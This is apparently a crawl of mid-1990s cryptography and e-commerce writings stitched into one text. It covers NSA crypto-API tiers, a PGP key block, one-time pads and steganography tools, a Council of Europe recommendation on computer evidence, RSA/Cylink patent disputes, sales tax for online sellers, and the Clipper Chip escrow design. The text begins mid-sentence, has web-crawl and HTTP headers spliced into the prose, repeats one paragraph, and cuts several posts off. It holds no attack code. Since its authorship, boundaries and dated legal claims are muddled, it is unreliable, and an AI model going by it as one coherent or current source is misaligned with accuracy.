they really wouldn't in this case despite this long-winded explanation, the people involved can ignore the details.

With my colleagues at First Virtual, I have recently completed what we intend to be the definitive statement about what FV has learned from a full year of processing payments over the Internet. This is not intended as a puff piece, but a serious academic-style overview. We're hoping it will prove to be a valuable resource for anyone trying to process payments on the net, even those who disagree with some aspects of FV's approach. The paper will be presented next week at the "Frontiers in Electronic Commerce" conference in Austin.

Indeed, 99.9% of decisions are made by people without any help from mathematics, using mathematical "intuition" which is usually very good. Part of our job, then, as mathematicians, can be to help steer intuition when it is off course. We give several examples where intuition regarding probability is likely to be wrong, and where different ways of looking at things can perhaps set it right. "Comparison without Disclosure" Peter Winkler AT&T Bell Labs The following problem arises in a variety of circumstances (e.g. bargaining, gossiping, passwords, entrapment): two people each possess some information and wish to discover if the information is the same, but without revealing any of the information in the case that it is not. How can they do it? We have collected a number of solutions, involving everything from number theory to playing cards, paper cups and airline reservations. We even have a solution that we think is perfect for computer science majors. We invite you to contribute further ideas to our list. Joint work (more accurately, joint fun) with Ron Fagin (IBM) and Moni Naor (Weizmann Institute).

What worries me as well as that those same people a wrapping themselves in a false security blanket by using the netscape commerce server (I don't trust anything that doesn't have publically available sources).

Several high-ranking NSA types were there, as well as their counterparts from various NATO countries plus a handful of industry crypto people (like me). The idea of the meeting was to find a way to separate cryptographic function from cryptographic interfaces, in a way that allows the applications that call the cryptographic functions to be more freely exported. That is, I can write and export an application that calls the crypto API but that doesn't actually implement the cryptography, and then, when it reaches its destination, the locally-preferred cryptosystem can be plugged right in. Crypto might be implemented in hardware (e.g., Fortezza) or software (e.g., with a shared library or pseudo-device driver). Obviously, this idea is somewhat (completely?) at odds with the criteria presented at last month's NIST workshops for exportable software key escrow systems. One of the requirements given for such systems is that it be difficult to replace the crypto with something that doesn't implement key escrow. But who ever said the government was consistent? Interestingly, it was clear that many people in NSA believe that applications that call an API are controlled under ITAR, but there is some recognition that this may be wishful thinking or may change soon. So while some (maybe most) of NSA wants to prevent development of standard APIs and prevent the export of applications that use them, others recognize that these will evolve by themselves anyway and will be very hard to control once they do. Anyway, the situation is far from clear. It seems best to encourage the realistic side of NSA as much as possible... I learned a few interesting things at the meeting. First of all, overwhelmingly, there is recognition, especially on the part of the non-US government security agencies, that there is enormous value in being able to buy off-the-shelf applications like Microsoft Word or Netscape Navigator and just plugging in the local military cryptosystem and using it for classified traffic. Everyone seemed to agree that there is a growing need for this and that it's too expensive to rely on custom software. There is also movement away from the traditional military ``link encryption'' approach that involves centrally- controlled secure networks in favor of a ``risk management'' approach that favors end-to-end security with off-the-shelf products. In other words, the parts of the military that are concerned with actually securing communications want exactly what we want, and are just starting to realize it. While lots of us have always known this, I had never heard it articulated as quite clearly (or as loudly) by actual comsec/infosec people before. Second, the senior NSA guy mentioned a few things I hadn't heard before. Fortezza is now approved for classified traffic through the SECRET level. Also, the ``type 1'' (classified) through ``type 4'' (unevaluated) cryptography standard is being scrapped in favor of a three ``tier'' system, as follows (these are approximate quotes, from my rough notes): Tier 1 traffic is stuff related to ``national command authority''. (Seems to be secret and top secret and up). It will require NSA cryptosystems, hardware implementation, and will NOT employ key escrow (because of the ``obvious risks''!). Tier 2 traffic is information that, if disclosed, would have ``national implications'' if revealed. Examples given include things like the national power grid, the banking system, etc. It was unclear whether any classified traffic would be included in tier 2. Clearly, some of what is now called ``sensitive but unclassified'' (SBU) will be in tier 2. Anyway, tier 2 systems will be approved by NIST (not NSA, although there will obviously be NSA input into the standards) and will require hardware implementation. Tier 2 traffic will be escrowed, and the government will escrow its own keys. Fortezza is an example tier 2 device (but read on...) Tier 3 traffic will be that which would have ``private implications'' if disclosed. Examples given included personal financial and medical records, etc. Current SBU traffic not in tier 2. Tier 3 would also be handled by NIST, employ commercial or government key escrow (like tier 2) and would be permitted to be implemented in software. Here's the surprise: Tiers 2 and 3 will be interoperable. So there will be published algorithms for tier 3. It is possible that tiers 2 and 3 will have the same algorithms, and that the government will suggest them. It was unclear with interoperability will require that all tier 2 algorithms will be published and implementable in tier 3 software or whether this means that tier 2 devices will also have to implement the tier 3 algorithms. There is an obvious choice of a tier 2/3 algorithm: Skipjack (although there were concerns that this is ``too slow''). So we may eventually find out whether ``S1'' was really Skipjack after all.... -matt Next message: Ricky Liswan: "Re: welcome to cis899" Previous message: tucker@meadow.mdso.vf.ge.com: "public key"WT02-B11-188IA087-000625-B036-316http://res2.resnet.upenn.edu:80/hypermail/cis899/0074.html 130.91.195.242 19970122043847 text/html 1649HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:38:38 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 1478Last-modified: Tue, 03 Oct 1995 00:01:16 GMT Daily Chat on CIS899: public key public key tucker@meadow.mdso.vf.ge.com Mon, 2 Oct 95 15:56:06 EDT Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: David Farber: "Crypto APIs" Previous message: Jean-Pierre Ebert: "Re: welcome to cis899"Here 'tis... --clark -----BEGIN PGP PUBLIC KEY BLOCK----- Version: 2.6 mQBNAjBwQJ4AAAECAMC430FeFTrmqH8ldmFW0mo0CGQiX4nlWpCAOe3gT3s7t6Ss xwykBlRBcCTngncZOrCq7h39lADE2xqiDztTIPkABRG0K0NsYXJrIFR1Y2tlciA8 dHVja2VyQG1lYWRvdy5tZHNvLnZmLmdlLmNvbT4= =dH+4 -----END PGP PUBLIC KEY BLOCK----- Next message: David Farber: "Crypto APIs" Previous message: Jean-Pierre Ebert: "Re: welcome to cis899"WT02-B11-189IA087-000625-B037-15http://res2.resnet.upenn.edu:80/hypermail/cis899/0073.html 130.91.195.242 19970122043950 text/html 2188HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:39:16 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 2017Last-modified: Tue, 03 Oct 1995 05:18:28 GMT Daily Chat on CIS899: Re: welcome to cis899 Re: welcome to cis899 Jean-Pierre Ebert (ebert@pender.ee.upenn.edu) Mon, 2 Oct 1995 10:58:44 -0400 (EDT) Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: tucker@meadow.mdso.vf.ge.com: "public key" Previous message: David Farber: "for Tues the 3 rd" In reply to: David Farber: "Re: welcome to cis899" Next in thread: Ricky Liswan: "Re: welcome to cis899" Next in thread: Jim S Gaw: "Re: welcome to cis899"No, I had to go to a conference and some appointments.

I just started using a program called Private Idaho: it's a breeze-easy way to handle PGP and to chain PGP remailers. (For Windows only.) There's info at http://www.eskimo.com/~joelm I've put the most recent version in ftp.iinet.net.au/incoming/dos Two files: PIDAHO.ZIP PIDAHO.SIG The Sig file is the MD5 hash of the Zip file (to verify you got what I put there, if you want to do that). If you don't know what MD5 is or how to use it, there's stuff about it at http://www.iinet.net.au/~heath/ If you don't know where to get PGP, iinet has versions in their ftp site. Or you can get a PGP-signed file from: ftp.mantis.co.uk/pub/cryptography/ *One time pad* This is everyone's ultimate weapon against anti-crypto officials. It's an unbreakable encryption system that's so simple it would be impossible to stamp out. Let me say a couple of things, in case you don't know about this. You need two things: your plain text as a disk file, and a file of random numbers that's at least as long as the plain-text file. (Don't worry about getting the random numbers - there are ways.) To encrypt: the plain text is XORed with the random file. Don't leave the room - it's easy to follow this. 0 XOR 0 = 0 0 XOR 1 = 1 1 XOR 0 = 1 1 XOR 1 = 0 So if your plain text was 0011 (the left-hand column), and your random numbers were the second column (0101), then your encrypted message would be 0110. To get back your plain text couldn't be easier. Just XOR the encrypted message with the same random numbers again. Like this: 0 XOR 0 = 0 1 XOR 1 = 0 1 XOR 0 = 1 0 XOR 1 = 1 Voila. 0011, the message back again. You don't have to do any of this yourself, of course. XOR is a very primitive function in computers and not even governments will be able to outlaw it. The encrypted message you get by doing this is just as random as the random numbers you use. There is no way to break this system. Which is why governments often use it to communicate with their nuclear subs, embassies and spies. You need to get a disk of random numbers to the person you want to communicate with. (Not hard, if you're motivated by knowing or suspecting that someone is trying to read your messages.) And you only use the random numbers once - nibbling away at them, and erasing the ones you've used. What I like is that it will always be possible to do this, from scratch, as long as there are computers. So easy. I've put one program that handles the details in ftp.iinet.net.au/incoming/dos OTP-10.ZIP (for "one-time-pad") OTP-10.SIG (the MD5 hash) The instructions with it are clear - indeed fun. Geeks: I haven't checked this program at the bit level, but it looks fine so far. If anyone discovers problems, let us all know. It works well on the macro level, wipes used parts of the pads, and keeps track of which pads are for encryption and which are for decryption. It also suggests how to get the random numbers we all need in these troubled times. *hiding the random numbers* You probably know that you don't have to stop there. You can hide an encrypted message in a gif or jpeg. (Steganography.) If you do that when you're using a one-time pad, then even if someone manages to extract your encrypted message, there is no way to distinguish it from random junk. No possible way. On the other hand, if you hide a PGP message this way, and someone extracts the encrypted message, then it's easy to find out it IS encrypted: PGP will tell you! (Because PGP files have headers.) You can get around that by stripping off the headers - leaving data that looks as random as a haystack in a tornado. Private Idaho will do that for you. You can get "stego" tools from ftp.mantis.co.uk/pub/cryptography/ and ftp.funet.fi *why all this?* The Attorney General's Office in Australia has made it plain that they want to cripple our ability to communicate privately over the Net. I object to that on grounds that go all the way back to Runnymede in 1215 AD. I have joined a Chorus of Objection. Do you believe that forcing everyone to lodge their private encryption keys with a government escrow agent will deter criminals? I don't. There are too many ways around it. But that's what Mr Orlowski at the Attnorney General's Office has in mind. If criminals won't be deterred, why do it? Why should the rest of us have to duck and cower because unelected officials decide they can't tolerate seeing effective privacy tools in the hands of "general users" - Mr Orlowski's view of us, it seems.

Considering that the aim of the Council of Europe is to achieve a greater unity between its members; Having regard to the unprecedented development of information technology and its application in all sectors of modern society; Realizing that the development of electronic information systems will speed up the transformation of traditional society into an information society by creating a new space for all types of communications and relations; Aware of the impact of information technology on the manner in which society is organised and on how individuals communications and interrelate; Conscious that an increasing part of economic and social relations will take place through or by use of electronic information systems; Concerned at the risk that electronic information systems and electronic information may also be used for committing criminal offenses; Considering that evidence of criminal offenses may be stored and transferred by these systems; Noting that criminal procedure laws of members states often do not yet provide for appropriate powers to search and collect evidence in these systems in the course of criminal investigations; Recalling that the lack of appropriate special powers may impair investigating authorities in the proper fufilment of their tasks in the face of the ongoing development of information technology; Recognising the need to adopt the legitimate tools which investigating authorities are afforded under criminal procedure laws the the specific nature of investigations in electronic information systems; Concerned by the potential risk that member states may not be able to render mutual legal assistance in an appropriate way when requested to collect electronic evidence within their territory from electronic information systems; Convinced of the necessity of strengthening internation co-operation and achieving a greater compatibility of criminal procedural laws in this field; Recalling Recommendation No. R (81) 20 of the Committee of Ministers on the harmonisation of laws relating to the requirement of written proof and to the admissibility of reproductions of documents and recordings on computers, Recommendation No. R. (85) 10 on letters rogatory for the interception of telecommunications, Recommendations No. R (87) 15 regulating the use of personal data in the police state and Recommendations No. R (89) 9 on computer-relating crime, Recommends the governments of member states: i. when reviewing their internal legislation and practice, to be guided by the principles appended to this recommendation; and ii. to ensure publicity for these principles among those investigating authorities and other professional bodies, in particular in the field of information technology, which may have an interest in their application. Appendix to Recommendation No R. (95) 13 concerning problems of criminal procedure law connected with information technology I. Search and seizure ----------------------------- 1. The legal distinction between searching computers systems and siezing data stored therein and intercepting data in the course of transmission should be clearly delineated and applied. 2. Criminal procedure laws should permit investigating authorities to search computer systems and seize data under similar conditions as under traditional powers of search and seizure. The person in charge of the system should be informed that the system has been searched and of the kind of data that has been siezed. The legal remedies that are provided for in general against search and seizure should be equally applicable in case of search in computer systems and in case of seizure of data therein. 3. During execution of a search, investigating authorities should have the power, subject to appropriate safeguards, to extend the search of other computer systems within their jurisdiction which are connected by menas of a network and seize the data therein, provided immediate action is required. 4. Where automatically processed data is functionally equivalent to a traditional document, provisions in the criminal procedure law relating to search and seizure of documents should apply equally to it. II. Technical Surveillance ------------------------------------- 5. in view of the convergance of information technology and telecommunications, law pertaining to technical surveillance for the purpose of criminal investigations, such as interception of telecommunications, should be reviewed and amended, where necessary, to ensure their applicability. 6. The law should permit investigating authorities to avail themselves of all necessary technical measures that enable the collection of traffic data in the investigation of crimes. 7. When collected in the course of a criminal investigation and in particular when obtained by means of intercepting telecommunications, data which is the object of legal protection and processed by a compuer system should be secured in an appropriate manner. 8. Criminal procedure laws should be reviewed with a view to making possible the interception of telecommunications and the collection of traffic data in the investigation of serious offenses against the confidentiality, integrity and availability of telecommunications or computer systems. III. Obligations to co-operate with the investigating authorities -------------------------------------------------------------------- 9. Subject to legal privileges or protection, most legal systems permit investigating authorities to order persons to hand over objects under their control that are required to serve as evidence. In a parallel fashion, provisions should be made for the power to order persons to submit any specified data under their control in a computer system in the form required by the investigating authority. 10. Subject to legal privileges or protection, investigating authorities should have the power to order persons who have data in a computer system under their control to provide all necessary information to enable access to a computer system and the data theirin. Criminal procedure law should ensure that a similar order can be given to other persons who have knowledge about the functioning of the computer system or measures applied to secure the data therein. 11. Specific obligations should be imposed on operators of public and private networks that offer telecommunications services to the public to avail themselves of all necessary technical measures that enable the interception of telecommunications by the investigating authorities. 12. Specific obligations should be imposed on service providers who offer telecommunications services to the public, either through public or private networks, to provide information to identify the user, when so ordered by the compentant investigating authority. IV. Electronic Evidence ------------------------ 13. The common need to collect, preserve, and present electronic evidence in ways that best ensure and reflect their integrity and irrefutable authenticity, both for the purposes of domestic prosecution and international co-operation, should be recognized. Therefore, procedures and technical methods for handling electronic evidence should be further developed, and particularly in such a way as to ensure their compatability between states. Criminal procedural law provisions on evidence relating to tradition documents should similarly apply to data stored in a computer system. V. Use of Encryption --------------------- 14. Measures should be considered to minimise the negative effects of the use of cryptography on the investigation of criminal offenses, without affecting its legitimate use more than is strictly necessary. VI. Research, statistics and training ------------------------------------- 15. The risks involved in the development and application of information technology with regard to the commission of criminal offenses should be assured continuously. In order to enable the competent authorities to keep abrest of new phenomena in the field of computer related offenses and to develop appropriate counter-measures, the collection and analysis of data on these offenses, including modus operandi and technical apsects, should be furthered. 16. The establishment of specialised units for the investigation of offenses, the combating of which requires special expertise in information technology, should be considered. Training programmes enabling criminal justice personnel to avail themselves of expertise in this field should be furthered. VII. International Cooperation ------------------------------ 17. The power to extend a search to other computer systems should also be applicable when the system is located in a foreign jurisdiction, provided that immediate action is required. In order to avoid possible violations of state sovereignity or international law, an unambigious legal basis for such extended search and seizure should be established. Therefore, there is an urgent need for negotiating international agreements as to how, when and to what extent such search and seizure should be permitted. 18. Expedited and adequate procedures as well as a system of liason should be available according to which the investigating authorities may request the foreign authorities to promptly collect evidence. For that purpose the requested authorities should be authorized to search a computer system and seize data with a view to its subsequent transfer. The requested authorities should also be authorized to provide trafficking data rtelated to a specific telecommunication, intercept a specific telecommunication or identify its source. For that purpose, the existing mutual legal assistance instruments need to be supplemented.

The arbitration order was as clear as mud on this point. It is clearer that they maintained the right to *use the patented technology* covered by the MIT patents in the creation of a product. In either case, it appears that their right does not extend to the point where they can sublicense the technology -- so it looks to me like Cylink can't sell you an RSA toolkit, for instance. - RSA has no rights to license the Stanford patents. RSA's FAQ (via baldwin@rsa.com) writes: > A. The Panel's ruling was very specific. Everything it said about third > parties, including RSA customers who use software, refers to their need > for patent licenses. If you bought software from RSA and RSA itself had > the rights to make that software and license it to you, you don't need > a separate patent license; rights to the patents came with the product. > The Ruling also states, "RSA has a right to license its software." This answer is evasive. RSA didn't give the complete sentence from the arbitration panel's order. It is: "Therefore, after April 6, 1990, RSA has a right to license its (RSA's) software to third-parties but does not have the right to license such third-parties under the Stanford patents." So, their answer appears to be correct only if the RSA software doesn't infringe the Stanford patents. And that seems to be a matter of opinion. Furthermore, the next sentence in the order continues: "To the extent RSA provides code to third-parties which causes an infringement of a valid and enforceable claim of the Stanford patents, assuming the third party is not separately licensed under the Stanford patent [sic], nothing in this order shall prevent Cylink from pursuing its rights under the Stanford patents against such third party." That's pretty clear to me folks, but make your own judgements. > If > you're using RSA's software -you didn't write your own- you don't need > a separate patent license under either the MIT or Stanford patents. Again, only to the extent that you're not infringing the Stanford patents. So, pay your nickel, take your chances. Does RSA's software infringe the Stanford patents?

DESY: "Re: Classroom" Previous message: Prakriya: "Re: Classroom"FYI, Mahesh (WSJ):U.S. Hewlett-Packard Lobbies Govt For Encryption Plan SAN FRANCISCO (AP-DJ)--Hewlett-Packard Co. is pushing an unusual scheme to protect electronic transactions around the world without running afoul of U.S. export laws, Wednesday's Wall Street Journal reports. The Palo Alto, California, computer maker said it's been lobbying government agencies for more than a year to gain support for its proposal, which uses a data-scrambling technology to protect transactions from tampering or theft. Strong encryption technologies ordinarily fall under tough export rules that limit technologies which could impede U.S. wire-tapping capabilities, a source of continuing friction between the government and high-technology companies. H-P, in a plan developed with the French company Gemplus SCA, wants to split the code-making technologies into two pieces that would be approved under different government standards. One device, which could fit in a standard computer, would contain a basic encryption capability that is designed to be broadly exported without the need to seek a separate export license for each foreign user. That device, dubbed an encryption engine, would be useless without the addition of another tiny piece of hardware that contains a code-making formula set at a specific strength. The second device, called a policy card, would be separately reviewed by the U.S. State Department for each customer. Government agencies, including codebreakers at the National Security Agency, would still have a say over the strength of encryption exports. But customers could build commercial applications around the proposed encryption engine, knowing that it will work with any code-making formula that governments might adopt in the future. Now they risk that their work will become obsolete amid policy changes in Washington and other countries. State Department officials weren't immediately available for comment. Stewart Baker, a former NSA general counsel who now practices law in Washington, D.C., termed the H-P plan a clever answer to the problem of shifting government policy. "There was a lot of skepticism when H-P first proposed it," said Lynn McNulty, a former encryption specialist at the National Institute of Standards and Technology. "But it looks to me that they are well on the way to the next step." Doug McGowan, an H-P manager involved with the project, said he expects to receive U.S. approval by 1996 to begin shipping the encryption engine freely to Western Europe and Canada. H-P's plan fits some of the NSA's objectives. For one thing, its technology embeds encryption technology in microchips that can't easily be modified by computer hackers. H-P's policy cards also could be adapted for a controversial Clinton administration proposal called key escrow, in which mathematical keys to break codes could be stored for later use by law enforcement or intelligence agencies, McGowan said. The plan complements a parallel H-P effort to develop a new generation of "smart" data cards to let consumers buy goods and services around the world electronically. Gemplus, a huge supplier of credit and debit cards in Europe, is supplying technology to that effort along with Informix Corp., a database software maker in Menlo Park, California. Jeff Hudson, an Informix vice president, said the partners' proposed cards could store money and a database worth of personal information, such as medical records. That approach could eliminate the need to connect to multiple companies or agencies to manage such information, since it would be stored on each card, the companies said. Next message: GLENN E.

The new service, dubbed International Business Exchange, or IBEX, is a joint effort of AT&T Corp., Dun & Bradstreet Corp., General Electric Co. and the U.S. Chamber of Commerce to let businesses use on-line traffic to line up suppliers, negotiate contracts, make and receive bids, and arrange the delivery of goods and services around the world. IBEX today also is expected to announce the backing of four new high-profile partners: Chase Manhattan Corp., Microsoft Corp., Digital Equipment Corp. and Viacom Inc.'s Simon & Schuster publishing unit. "The way people conduct international trade today is they look at directories, they get on airplanes and they receive unsolicited letters," said Peter Sandiford, chief executive and president of the Global Business Alliance Inc., which manages IBEX. "This system allows businesses to locate, qualify and negotiate with business partners around the world from your PC." Scores of companies are developing tools for so-called electronic commerce, largely focusing on enabling business-oriented transactions on the Internet. The IBEX system will be launched as a discrete on-line service and is to be accessible via the Internet sometime next year. The new service will be based on networks provided by AT&T and GE. Digital Equipment will handle software orders and provide the IBEX package in its PCs, while the Chamber of Commerce, a nonprofit business federation, will resell the service through more than 3,000 offices world-wide. Such corporate muscle could give the service the strength it needs to build business-to-business electronic relationships. "They're working with the right people," said Brian O'Connell, staff editor at Technologic Partners, a high-tech publishing and consulting firm. Companies such as Dun & Bradstreet and AT&T, he said, "are as close to global organizations as you can get." The IBEX software allows companies to sign on and submit a request for goods or services, which is posted anonymously. The request could be styled using an array of categories offered by the service, including location, product category, payment and shipping terms. The customer would then receive bids from businesses hoping to land the contract. Once a bid is chosen, the identities of the businesses are disclosed and negotiations begin. IBEX allows them to attach documents such as confidentiality agreements, contracts and purchase orders. The service amounts to a virtual business agent. "You are able to create the services provided by an in-country agent from your PC," said IBEX's Mr. Sandiford. Stan Lepeak, program manager for Meta Group, a research firm, said the new service "is a good quick way to engage in true electronic commerce without the baggage" of Internet security concerns and the relatively high cost of commercial on-line services. IBEX, he noted, costs $250 to register for the service and a paltry $5 per transaction. Analysts noted, however, the difficulties IBEX may face in gaining international acceptance and getting businesses to trust counterparts they may never meet off-line. Esther Dyson, president of EDventure Holdings Inc., which publishes the hightech newsletter Release 1.0, said IBEX needed to provide protection against "deadbeats and jerks" that might fail to honor contracts. Moreover, "people outside the U.S. don't have credit cards, and there are currency and tax regulations they'll have to deal with," Ms. Dyson said. Mr. Sandiford said there was no way to guarantee that a company would honor a deal, but there are tools for due diligence. When companies sign on to the service, they offer a host of references that can be contacted independently. Potential customers of a company can also refer to information provided by D&B and contract a third-party consultant to conduct due diligence in a foreign country.

It's unfortunately much more complex than this. The dispute went to arbitration, where a ruling was made. Strangely, both parties now claim to have won completely. I've never seen two interrpretations of any legal document that are so different. There are actually two batches of patents involved in the suit, some from work done at MIT and some from Stanford. The MIT patents cover the RSA cryptosystem (a public key encrytion technique discovered by the founders of RSA Data Security, or RSADSI, which is a company), while the Stanford patents include Diffie-Hellman exponential key exchange and the original idea of public key cryptography. There are other ways to do public key cryptography besides RSA, though RSA is simpler and more popular than the other techniques. The Stanford patents, however, appear to cover the whold field of public key cryptography. Before this recent ruling, all the patents were controlled by Public Key Partners (PKP), which was run by Jim Bidzos. PKP was a partnership including Stanford, MIT, Cylink, and RSADSI and was run by Jim Bidzos, president of RSADSI. Cylink wanted to use and license the patents on its own, but was blocked by PKP, which started the whole mess. RSADSI has been selling toolkits that let people use technologies covered in the Stanford patents, and Cylink now claims that RSADSI didn't have rights to do this. Cylink has reportedly threatened to charge RSADSI's customers $50,000 each for using patents that weren't licensed correctly. RSA has now taken to claiming that the Stanford patents are invalid, to prevent Cylink from harrassing their customers. I think RSA is probably right here, since the Stanford patents weren't filed properly. (For example, they were submitted more than a year after the publication of the techniques they cover.) Meanwhile Cylink wants to be able to use the RSA cryptosystem without paying royalties to RSADSI, so they seem to now be claiming that the MIT patents are invalid! These patents actually seem fairly strong to me, so I don't think this claim would be likely to make it very far. Hopefully we'll know more soon about the situation. The outcome will have a big impact on the ability of companies to make and sell products using cryptography in the USA. Anything from encrypted encrypted telephones to secure e-mail to Internet commerce need public key technologies, so the outcome of the lawyering is quite important. Currently the patent licensing situation is a huge expensive mess for anyone trying to bring a product to market, and I'm hopeful that as a result of all this we'll soon have non-patented ways of doing public key cryptography.

Many of the states are now saying to mail order companies, you sell to someone in my state and you owe us tax , regardless of where you are physically located or incorporated. There is legislation pending in state legislatures to back this up. If the courts find this legal this will undoubtedly become the "precedent" the states will follow in dealing with "email order".

Many of the states are now saying to mail order companies, you sell to someone in my state and you owe us tax , regardless of where you are physically located or incorporated. There is legislation pending in state legislatures to back this up. If the courts find this legal this will undoubtedly become the "precedent" the states will follow in dealing with "email order". Big catalog companies like Lands End are already collecting the applicable tax for all states just in case they have to cough it up.It can vary from no tax to 7%?. >Now, that's our position, but we're still eager to do anything we can to >help our sellers deal with this extremely troublesome issue. > >One thing that has been suggested by several people is that we tell the >sellers where the buyers come from. We have chosen not to do this >because A) the sellers can ask as easily as we ask -- it's not like we >have any postal relationship with our buyers anyway, and B) we have >tried to keep as close as possible to an absolute guarantee of privacy >for our customers. (Note also that FV >doesn't know your address or local tax laws with any more certainty that >it knows the buyer's address or local tax laws, another reason why it >doesn't make sense for FV to be making decisions about sales tax >liability.) > FV AS A TAX CLEARINGHOUSE? Again, you DO know both the postal address of both the buyer and the seller..Here's an excerpt from the info a buyer has to send card.com. Please enter your street address, including any necessary apartment : #: Street-Address: 1776 K Street, NW #: #: Note that this should be the same as the billing address of the #: credit card which you will later link to your First Virtual #: account. This may be no more than 30 characters per line. #: Please enter the name of your city or locality, in no more than 30 #: characters. #: #: City: Washington #: Please enter your state, province, or other relevant political #: subunit of your country, in no more than 30 characters. #: State: DC And you have similar information from the buyers including banking institution, who will be sending a 1099 to IRS which includes any FV revenue. It would violate no privacy if you just added the applicable tax to the sale and passed it on to the appropriate jurisdiction. An example of this would be Fuller Brush who has a number of independent sales agents that can sell products through a nationwide 800#, the sale is credited to the individual agent who is paid (as an independent agent), and Fuller Brush charges the customers card and collects the applicable tax and presumably sends to whomever its due (Caesar no doubt). Fuller states on their order form": "Since we have a presence in all 50 states, we are required by law to collect sales tax for every state." > >Anyway, for now, the only thing I can recommend for FV sellers who want >to do the best they can is something like the following: > >-- Determine where your sales are taxable. This depends pretty >critically on where you do business, and may (as noted previously on >this thread) include local, county, state, or national taxes, on either >all customers or on customers within those locales. You probably want to consult a local lawyer. > >-- Modify your web pages/order-forms/whatever to have, for example, a >click-box that says "Click here if you are a resident of Michigan" to >add in the applicable taxes. > >-- Infohaus sellers can sell two version of their merchandise, one of >which includes the tax, and tell their customers "if you live in >Michigan, legally you must buy the more expensive one." > I dont think its reasonable to suggest that small infropreneurs, in some cases only a Mom or a Pop, should bear the burden of dealing with tax from multiple states. Nor should we have to stock multiple inventories of our info-products. Nor should we be expected to email every customer after a sale and say "Oh by the way , where are you from, and if you're from Kansas please send us 12 cents using a 32 cent stamp! I do think a discussion needs to be joined on these issues, they are multiple and there is still time to work on them before the knock on the door. Since FV is one of the pioneers in creating an environment for elctronic commerce I think that they should "pioneer" in working on a reasonable solution to "taxing" problems as well.

The digital cashcards, which make it possible to order goods and services from home personal computers, could also allow money transactions and bypass the banking system. Payments made with the cards, which are marketed by the Mondex firm in Britain, are carried out through an electronic chip. ``The chip can contain millions of dollars. Unlike VISA cards, there is no registration of each operation,'' said Ronald Noble, a U.S. Treasury official leading the Financial Action Task Force which groups 26 rich nations. ``It's a way of moving vast sums of money with no record of the transaction. The makers are looking at ways of tying the cards up to (the worldwide computer network) Internet,'' Noble told reporters after the agency's members held their annual meeting in Paris. He said the agency had met the makers of the card about what he called ``cybercash'' and that they were being very cooperative about money laundering concerns. Dirty money from drugs, arms trafficking and other serious crime worldwide totaled between $300 and 600 million, Noble said. ``The Colombian Cali cartel is believed to generate revenues of 7 billion dollars a year -- that's the combined revenues of Toyota, Boeing and Pepsi,'' he added.

THE CLIPPER CHIP: A TECHNICAL SUMMARY Dorothy Denning Revised, April 21, 1993 INTRODUCTION On April 16, the President announced a new initiative that will bring together the Federal Government and industry in a voluntary program to provide secure communications while meeting the legitimate needs of law enforcement. At the heart of the plan is a new tamper-proof encryption chip called the "Clipper Chip" together with a split-key approach to escrowing keys. Two escrow agencies are used, and the key parts from both are needed to reconstruct a key. CHIP CONTENTS The Clipper Chip contains a classified single-key 64-bit block encryption algorithm called "Skipjack." The algorithm uses 80 bit keys (compared with 56 for the DES) and has 32 rounds of scrambling (compared with 16 for the DES). It supports all 4 DES modes of operation. The algorithm takes 32 clock ticks, and in Electronic Codebook (ECB) mode runs at 12 Mbits per second. Each chip includes the following components: the Skipjack encryption algorithm F, an 80-bit family key that is common to all chips N, a 30-bit serial number (this length is subject to change) U, an 80-bit secret key that unlocks all messages encrypted with the chip The chips are programmed by Mykotronx, Inc., which calls them the "MYK-78." The silicon is supplied by VLSI Technology Inc. They are implemented in 1 micron technology and will initially sell for about $30 each in quantities of 10,000 or more. The price should drop as the technology is shrunk to .8 micron. ENCRYPTING WITH THE CHIP To see how the chip is used, imagine that it is embedded in the AT&T telephone security device (as it will be). Suppose I call someone and we both have such a device. After pushing a button to start a secure conversation, my security device will negotiate an 80-bit session key K with the device at the other end. This key negotiation takes place without the Clipper Chip. In general, any method of key exchange can be used such as the Diffie-Hellman public-key distribution method. Once the session key K is established, the Clipper Chip is used to encrypt the conversation or message stream M (digitized voice). The telephone security device feeds K and M into the chip to produce two values: E[M; K], the encrypted message stream, and E[E[K; U] + N; F], a law enforcement field , which are transmitted over the telephone line. The law enforcement field thus contains the session key K encrypted under the unit key U concatenated with the serial number N, all encrypted under the family key F. The law enforcement field is decrypted by law enforcement after an authorized wiretap has been installed. The ciphertext E[M; K] is decrypted by the receiver's device using the session key: D[E[M; K]; K] = M . CHIP PROGRAMMING AND ESCROW All Clipper Chips are programmed inside a SCIF (Secure Compartmented Information Facility), which is essentially a vault. The SCIF contains a laptop computer and equipment to program the chips. About 300 chips are programmed during a single session. The SCIF is located at Mykotronx. At the beginning of a session, a trusted agent from each of the two key escrow agencies enters the vault. Agent 1 enters a secret, random 80-bit value S1 into the laptop and agent 2 enters a secret, random 80-bit value S2. These random values serve as seeds to generate unit keys for a sequence of serial numbers. Thus, the unit keys are a function of 160 secret, random bits, where each agent knows only 80. To generate the unit key for a serial number N, the 30-bit value N is first padded with a fixed 34-bit block to produce a 64-bit block N1. S1 and S2 are then used as keys to triple-encrypt N1, producing a 64-bit block R1: R1 = E[D[E[N1; S1]; S2]; S1] . Similarly, N is padded with two other 34-bit blocks to produce N2 and N3, and two additional 64-bit blocks R2 and R3 are computed: R2 = E[D[E[N2; S1]; S2]; S1] R3 = E[D[E[N3; S1]; S2]; S1] . R1, R2, and R3 are then concatenated together, giving 192 bits. The first 80 bits are assigned to U1 and the second 80 bits to U2. The rest are discarded. The unit key U is the XOR of U1 and U2. U1 and U2 are the key parts that are separately escrowed with the two escrow agencies. As a sequence of values for U1, U2, and U are generated, they are written onto three separate floppy disks. The first disk contains a file for each serial number that contains the corresponding key part U1. The second disk is similar but contains the U2 values. The third disk contains the unit keys U. Agent 1 takes the first disk and agent 2 takes the second disk. Thus each agent walks away knowing an 80-bit seed and the 80-bit key parts. However, the agent does not know the other 80 bits used to generate the keys or the other 80-bit key parts. The third disk is used to program the chips. After the chips are programmed, all information is discarded from the vault and the agents leave. The laptop may be destroyed for additional assurance that no information is left behind. The protocol may be changed slightly so that four people are in the room instead of two. The first two would provide the seeds S1 and S2, and the second two (the escrow agents) would take the disks back to the escrow agencies. The escrow agencies have as yet to be determined, but they will not be the NSA, CIA, FBI, or any other law enforcement agency. One or both may be independent from the government. LAW ENFORCEMENT USE When law enforcement has been authorized to tap an encrypted line, they will first take the warrant to the service provider in order to get access to the communications line. 